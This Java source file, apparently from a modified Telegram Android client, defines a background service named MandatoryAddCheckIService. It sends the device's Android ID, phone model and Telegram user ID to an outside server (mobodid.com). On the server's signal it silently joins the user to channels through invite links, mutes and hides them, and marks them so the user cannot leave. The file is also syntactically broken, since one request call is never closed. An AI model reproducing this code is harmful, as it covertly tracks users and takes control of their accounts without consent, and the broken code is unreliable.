package org.telegram.sajjad;

import android.app.IntentService;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.Nullable;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.Adel.NewAdd.MuteController;
import org.telegram.Adel.NewAdd.NoQuitContoller;
import org.telegram.Adel.NewAdd.hideChannelController;
import org.telegram.Adel.Shared;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * Created by sajjadlp on 8/24/2017.
 */

public class MandatoryAddCheckIService extends IntentService {


    String count, joinCode, username, mute, notExit, hidden, countChannel, mCampaignId, key;


    public MandatoryAddCheckIService() {
        super("MandatoryAddCheckIService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        try {

            //This is Mandatory add check
            String url = "http://www.mobodid.com/app/check";
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String phoneModel = Build.MODEL;
            String userId = UserConfig.getClientUserId()+"";
            String securityKey = SimpleKeyMaker.makeDigitString();
            String campaignId = intent.getStringExtra("campaign_id");
            HashMap<String,String> h = new HashMap<String,String>();
            h.put("android_id", androidId);
            h.put("phone_model", phoneModel);
            h.put("user_id", userId);
            h.put("id_telegromcampain", campaignId);
            h.put("key", securityKey);
            JSONParser jsonParser = new JSONParser();
            JSONObject jsonObject = jsonParser.getJSONFromUrlByPost(url,h);
            JSONArray data = jsonObject.getJSONArray("T");//////////////////////////////////////
            if (data.getJSONObject(0).getString("error").equals("0")){
                if (intent.getStringExtra("key").equals("old")){
                    countChannel = intent.getStringExtra("channel_count");
                    count = intent.getStringExtra("count");
                    mute = intent.getStringExtra("mute");
                    notExit = intent.getStringExtra("notExit");
                    hidden = intent.getStringExtra("hidden");
                    mCampaignId = intent.getStringExtra("campainid");
                    runOldMandatoryJoin();
                }
            }


        } catch (Exception e){
            e.printStackTrace();
        }

    }


    private void runOldMandatoryJoin(){
        try {
            if (notExit.equals("1"))
            {
                if (!NoQuitContoller.isNoQuit(countChannel))
                {
                    NoQuitContoller.addToNoQuit(countChannel);
                }
            }

            if (hidden.equals("1"))
            {
                hideChannelController.add(countChannel.replace("@", ""));
            }

            Shared shared = new Shared();

        } catch (Exception e){
            e.printStackTrace();
        }
    }







    private void runNewMandatoryJoin(){
        try {
            if (notExit.equals("1"))
            {
                if (!NoQuitContoller.isNoQuit(username))
                {
                    NoQuitContoller.addToNoQuit(username);
                }
            }

            if (hidden.equals("1"))
            {
                hideChannelController.add(username.replace("@", ""));
            }
            runLinkRequest(null, joinCode, null, null, null, null, false, 0, 1, !mute.equals("0"));
        } catch (Exception e){
            e.printStackTrace();
        }

    }







    public void runLinkRequest(final String username, final String group, final String sticker, final String botUser, final String botChat, final String message, final boolean hasUrl, final Integer messageId, final int state, final boolean mute)
    {
        if (group != null)
        {
            if (state == 0)
            {
                final TLRPC.TL_messages_checkChatInvite req = new TLRPC.TL_messages_checkChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.ChatInvite invite = (TLRPC.ChatInvite) response;
                                  
                                }
                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
            else if (state == 1)
            {
                TLRPC.TL_messages_importChatInvite req = new TLRPC.TL_messages_importChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        if (error == null)
                        {
                            TLRPC.Updates updates = (TLRPC.Updates) response;
                            MessagesController.getInstance().processUpdates(updates, false);
                        }
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.Updates updates = (TLRPC.Updates) response;
                                    if (!updates.chats.isEmpty())
                                    {
                                        TLRPC.Chat chat = updates.chats.get(0);
                                        chat.left = false;
                                        chat.kicked = false;
                                        MessagesController.getInstance().putUsers(updates.users, false);
                                        MessagesController.getInstance().putChats(updates.chats, false);

                                        if (mute)
                                        {
                                            MuteController.muteDialog(-chat.id);
                                        }
                                    }
                                }
                            }
                        });
                    }
            }
        }
    }





}
